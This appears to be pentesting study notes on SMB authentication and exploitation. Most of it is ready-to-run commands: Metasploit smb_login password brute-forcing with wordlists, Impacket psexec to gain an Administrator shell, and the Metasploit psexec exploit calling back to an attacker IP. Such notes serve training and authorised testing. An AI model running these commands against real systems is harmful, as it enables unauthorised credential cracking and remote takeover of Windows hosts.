
###### The SMB protocol utilizes two levels of authentication, namely:
	 --> User Authentication
	 --> Share Authentication


#### SMB Authentication
Client ------------------------------------------------ Server
	 -------------Authentication Request------------->
	 <----Encrypt Random string with user's hash----
	 -----------------Encrypted string ---------------->
	 <--------------Access Granted---------------------


### Exploiting SMB with `PsExec`
Before start this module we need to collect the `username` and `password` or `hash` or the password
1. SMB login Brute-Force attack - Brute-Force user and pass using `msfconsole`
```
search smb_login
use auxiliary/scanner/smb/smb_login
show options
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/unix_passwords.txt
set rhosts <target_ip>
set verbose false
run / exploit
```

2. Take Access of SMB
```
psexec.py Administrator@<target_ip> cmd.exe

or 

impacket-psexec Administrator@<target_ip> cmd.exe
```

3. Use metasploit Module `psexec`
```
search psexec
use exploit/windows/smb/psexec
show options
set rhosts <target_ip>
set lhost <attacker_ip>
set SMBUser Administrator
set SMBPass qwertyuiop
run
```